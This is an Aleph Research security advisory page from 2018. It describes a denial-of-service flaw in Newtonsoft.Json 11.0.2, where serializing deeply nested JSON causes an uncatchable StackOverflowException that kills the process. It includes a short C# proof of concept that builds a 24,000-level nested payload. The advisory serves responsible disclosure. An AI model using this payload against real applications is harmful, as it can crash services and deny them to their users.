<!DOCTYPE html>
<html lang="en"> 

<head>
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-92665328-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        
        gtag('config', 'UA-92665328-1');
    </script>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

  
 
   
  
  
  
  
  
  

  
  
  
  
  
  
  

    
  
  
  
  
  
  <title>[ALEPH-2018004] Applications that use Newtonsoft.Json might be exposed to DOS vulnerability</title>
  

  <meta name="name" content="ALEPH-2018004">
  <meta name="description" content="Applications that use Newtonsoft.Json might be exposed to DOS vulnerability">
  <meta name="image" content="https://alephsecurity.com/assets/img/logo-black.png">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:site" content="@alephsecurity">
  <meta name="twitter:creator" content="@alephsecurity">
  <meta name="twitter:title" content="ALEPH-2018004">
  <meta name="twitter:url" content="https://alephsecurity.com/vulns/aleph-2018004"> 
  <meta name="twitter:description" content="Applications that use Newtonsoft.Json might be exposed to DOS vulnerability">
  <meta name="twitter:image:src" content="https://alephsecurity.com/assets/img/logo-black.png">
  <meta property="og:site_name" content="">
  <meta property="og:title" content="ALEPH-2018004">
  <meta property="og:type" content="article">
  <meta property="og:description" content="Applications that use Newtonsoft.Json might be exposed to DOS vulnerability">
  <meta property="og:url" content="https://alephsecurity.com/vulns/aleph-2018004"> 

  <meta property="article:published_time" content="2018-10-22T00:00:00+00:00">

<meta property="article:author" content="https://alephsecurity.com"> 
<meta property="og:image" content="https://alephsecurity.com/assets/img/logo-black.png">
   
  



    <link rel="icon" href="/favicon.png">
    <link rel="stylesheet" 
href="https://fonts.googleapis.com/css?family=Inconsolata:400,700">
    <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      messageStyle: "none",
      tex2jax: {preview: "none"},
      CommonHTML: { linebreaks: { automatic: true } },
      "HTML-CSS": { linebreaks: { automatic: true } },
      SVG: { linebreaks: { automatic: true } }
    });
    </script>
    <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
    </script>

</head>

<body>

    <div class="wrapper">
        <div class="page__back">
<a href="/">&lt;-- <span class="smallogo">◊ê</span></a>
</div>
<div class="page">



<div class="advisory">
    <div class="advisory__title">
    	<h1>Applications that use Newtonsoft.Json might be exposed to DOS vulnerability</h1>
    </div>
    <div class="advisory__subtitle">
    Aleph Research Advisory
    </div>
    <div class="advisory__meta">
    	<p></p>
    </div>
   <h2>Identifier</h2>
    <div  class="cve-moderate"><span class="" title="Applications that use Newtonsoft.Json might be exposed to DOS vulnerability"><a href="/vulns/aleph-2018004">ALEPH-2018004</a></span></div>

    
 
    
      
    <h2>Severity</h2>
    Moderate
    
   
    
    
    <h2>Products</h2>
	<div class="numberedlistnoalternative">
    <ol>
    
	<li><p>Newtonsoft.Json</p>
</li>
    
	</ol>
    </div>    
    

    
    
    
    
    

    
        <h2>Vulnerable Version</h2>
        <p>11.0.2</p>

    


    
   <h2>Technical Details</h2>
       <div class="advisory__content"?>
       <p>A defect in Newtonsoft.Json (aka Json.NET) library might expose applications that use it to a DOS vulnerability.</p>

<p>Json.NET is the No.1 community package in terms of downloads (more than 150,000,000) in Nuget (package manager for .NET). It is used by many web applications as well as Desktop applications to handle Json - serialize, deserialize, etc.</p>

<p>When using this library to serialize a highly nested JSON object, a StackOverflow exception is thrown.
This exception cannot be caught and it will immediately terminate the entire process (see our <a href="/2018/09/13/StackOverflowException/">blog post</a>).</p>

<p>This library is not vulnerable by its own, but there might be a lot of scenarios where application that uses it become vulnerable due to this issue.</p>

<p>For example, application that gets JSON as an input and use this library to write it in a pretty format (Indented). In this case, if the input contains a highly nested JSON, the application process will terminate and the application will be unavailable.</p>

<h2 id="proof-of-concept">Proof Of Concept</h2>
<p>Following is a sample program that demonstrate the issue:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">using</span> <span class="n">System</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Linq</span><span class="p">;</span>
<span class="n">using</span> <span class="n">Newtonsoft</span><span class="p">.</span><span class="n">Json</span><span class="p">;</span>
<span class="n">using</span> <span class="n">Newtonsoft</span><span class="p">.</span><span class="n">Json</span><span class="p">.</span><span class="n">Linq</span><span class="p">;</span>

<span class="n">namespace</span> <span class="n">JsonTests</span>
<span class="p">{</span>
    <span class="n">class</span> <span class="n">Program</span>
    <span class="p">{</span>
        <span class="k">static</span> <span class="kt">void</span> <span class="n">Main</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">//Create a string representation of an highly nested object (JSON serialized)</span>
            <span class="kt">int</span> <span class="n">nRep</span> <span class="o">=</span> <span class="mi">24000</span><span class="p">;</span>
            <span class="n">string</span> <span class="n">json</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">Concat</span><span class="p">(</span><span class="n">Enumerable</span><span class="p">.</span><span class="n">Repeat</span><span class="p">(</span><span class="s">"{a:"</span><span class="p">,</span> <span class="n">nRep</span><span class="p">))</span> <span class="o">+</span> <span class="s">"1"</span> <span class="o">+</span>
                          <span class="n">string</span><span class="p">.</span><span class="n">Concat</span><span class="p">(</span><span class="n">Enumerable</span><span class="p">.</span><span class="n">Repeat</span><span class="p">(</span><span class="s">"}"</span><span class="p">,</span> <span class="n">nRep</span><span class="p">));</span>

            <span class="c1">//Parse this object (Parsing works well - no exception is being thrown)</span>
            <span class="n">var</span> <span class="n">parsedJson</span> <span class="o">=</span> <span class="n">JObject</span><span class="p">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">json</span><span class="p">);</span>
            
            <span class="n">using</span> <span class="p">(</span><span class="n">var</span> <span class="n">ms</span> <span class="o">=</span> <span class="n">new</span> <span class="n">MemoryStream</span><span class="p">())</span>
            <span class="n">using</span> <span class="p">(</span><span class="n">var</span> <span class="n">sWriter</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StreamWriter</span><span class="p">(</span><span class="n">ms</span><span class="p">))</span>
            <span class="n">using</span> <span class="p">(</span><span class="n">var</span> <span class="n">jWriter</span> <span class="o">=</span> <span class="n">new</span> <span class="n">JsonTextWriter</span><span class="p">(</span><span class="n">sWriter</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="c1">//Trying to serialize the object will result in StackOverflowException !!!</span>
                <span class="n">parsedJson</span><span class="p">.</span><span class="n">WriteTo</span><span class="p">(</span><span class="n">jWriter</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="c1">//ToString throws StackOverflowException as well  (ToString is very unefficient - even for smaller payloads, it will occupy a lot of CPU &amp; Memory)</span>
            <span class="c1">//parsedJson.ToString();</span>

            <span class="c1">//JsonConvert.SerializeObject throws StackOverflowException as well</span>
            <span class="c1">//string a = JsonConvert.SerializeObject(parsedJson);</span>

        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
       </div>

   
  

    <h2>Timeline</h2>
    <div class="list"><ul><li><div class="list__date"><span>22-Oct-18<span></div>: Public disclosure.</li><li><div class="list__date"><span>25-Sep-18<span></div>: Deadline.</li><li><div class="list__date"><span>27-Jun-18<span></div>: Reported (Report directly to Newtonsoft).</li><li><div class="list__date"><span>29-May-18<span></div>: Reported (Report to library owner through NuGet).</li></ul></div>




    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
    
        

        
            
    
        <h2>Posts</h2>
	
        <div class="pagelist__narrow"><ul>                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     				                      <li onclick="javscript:document.location.href='/2018/10/22/StackOverflowException/'">    <a href="/2018/10/22/StackOverflowException/">It takes only one StackOverflowException to bring down an Application deployed on IIS </a>    <div class="pagelist__subtitle">By <a href="/authors/gilm">Gil Mirmovitch</a>, <div class="pagelist__date"><span>22-Oct 2018</span></div></div></li>			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                                	     			                                </ul></div>

    



    
        <h2>Credit</h2>
        <div class="list">
        <ul>
        
        <li>
            <a href="/authors/gilm">Gil Mirmovitch</a>    			    		of Aleph Research, HCL Technologies
        </li>
        
        </ul>
        </div>
    
    

 	
       


</div> 

</div>
    </div>

</body>

</html>
